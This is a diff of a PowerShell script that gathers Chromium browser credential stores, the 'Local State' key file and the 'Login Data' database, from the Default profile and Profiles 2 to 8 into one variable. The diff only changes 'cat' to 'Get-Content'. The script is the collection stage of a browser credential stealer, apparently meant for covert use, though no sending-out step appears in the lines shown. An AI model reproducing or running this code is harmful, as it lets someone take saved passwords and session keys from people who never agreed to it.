@@ -1,8 +1,8 @@
-$var += cat "Local State"
+$var += Get-Content "Local State"
 
 cd Default
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
     # try profiles if null, Brute Force style
 
@@ -13,7 +13,7 @@ if (Test-Path -Path $Folder) {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 $Folder = 'Profile 2'
 if (Test-Path -Path $Folder) { 
@@ -29,7 +29,7 @@ if (Test-Path -Path $Folder) {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 $Folder = 'Profile 4'
 if (Test-Path -Path $Folder) { 
@@ -38,7 +38,7 @@ if (Test-Path -Path $Folder) {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 $Folder = 'Profile 5'
 if (Test-Path -Path $Folder) { 
@@ -47,7 +47,7 @@ if (Test-Path -Path $Folder) {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 $Folder = 'Profile 6'
 if (Test-Path -Path $Folder) { 
@@ -56,17 +56,17 @@ if (Test-Path -Path $Folder) {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 $Folder = 'Profile 7'
 if (Test-Path -Path $Folder) { 
    cd $Folder
-   $var += cat "Login Data"
+   $var += Get-Content "Login Data"
 } else {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 $Folder = 'Profile 8'
 if (Test-Path -Path $Folder) { 
@@ -75,7 +75,7 @@ if (Test-Path -Path $Folder) {
     "Path doesn't exist."
 }
 
-$var += cat "Login Data"
+$var += Get-Content "Login Data"
 
 start-sleep 4
 
